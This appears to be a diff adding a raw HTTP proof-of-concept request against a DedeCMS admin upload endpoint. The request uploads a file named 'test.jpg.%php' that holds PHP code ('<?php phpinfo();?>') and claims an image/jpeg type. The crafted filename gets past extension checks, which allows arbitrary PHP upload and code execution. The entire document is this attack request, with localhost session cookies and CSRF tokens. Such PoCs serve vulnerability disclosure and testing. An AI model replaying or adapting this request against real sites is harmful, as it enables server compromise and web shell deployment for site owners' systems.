@@ -1,0 +1,26 @@
+POST /dede/dialog/select_images_post.php HTTP/1.1
+Host: localhost
+Content-Length: 352
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryM6ENOWR29kQWBpEr
+Accept: */*
+Origin: http://localhost
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost/dede/article_edit.php?aid=1
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: menuitems=1_1%2C2_1%2C3_1; PHPSESSID=28lulvv55eukn9f95gfh1msb4g; DedeUserID=1; DedeUserID__ckMd5=7ccfa4d5c652a435; DedeLoginTime=1606723623; DedeLoginTime__ckMd5=9dc840d9a00ff330; dede_csrf_token=ff700b51bf3a3155ddaf3475d10d669d; dede_csrf_token__ckMd5=6be35abc302b6c7d; ENV_GOBACK_URL=%2Fdede%2Fcontent_list.php%3Fchannelid%3D1; ckCsrfToken=wsBsqSEdg69HC8IvPp7FO16gLddBU2cZ50O48VZK
+Connection: close
+
+------WebKitFormBoundaryM6ENOWR29kQWBpEr
+Content-Disposition: form-data; name="upload"; filename="test.jpg.%php"
+Content-Type: image/jpeg
+
+<?php phpinfo();?>
+------WebKitFormBoundaryM6ENOWR29kQWBpEr
+Content-Disposition: form-data; name="ckCsrfToken"
+
+wsBsqSEdg69HC8IvPp7FO16gLddBU2cZ50O48VZK
+------WebKitFormBoundaryM6ENOWR29kQWBpEr--
